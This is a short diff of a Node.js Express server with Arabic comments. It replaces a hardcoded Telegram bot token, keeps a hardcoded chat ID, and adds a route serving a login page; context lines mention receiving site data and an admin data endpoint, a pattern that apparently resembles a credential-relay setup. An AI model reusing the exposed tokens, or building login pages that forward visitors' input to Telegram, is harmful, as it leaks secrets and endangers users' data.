@@ -12,7 +12,7 @@ app.use(bodyParser.json());
 app.use(express.static('public'));
 
 // Telegram Bot Token و Chat ID - ضع معلوماتك هنا
-const TELEGRAM_BOT_TOKEN = '8591936291:AAH2ajMbKooQ0ia8chU9OSABeuKUhRCUJCI';
+const TELEGRAM_BOT_TOKEN = '8602765183:AAFv3ytqUaBO06eXePOzOINmGaC3JGUdvwc';
 const TELEGRAM_CHAT_ID = '5859857970';
 
 // مسار لاستقبال البيانات من الموقع
@@ -84,6 +84,10 @@ app.get('/admin/data', (req, res) => {
 // مسار رئيسي
 app.get('/', (req, res) => {
     res.sendFile(__dirname + '/index.html');
+});
+
+app.get('/login', (req, res) => {
+    res.sendFile(__dirname + '/login.html');
 });
 
 // دالة لحفظ البيانات في ملف
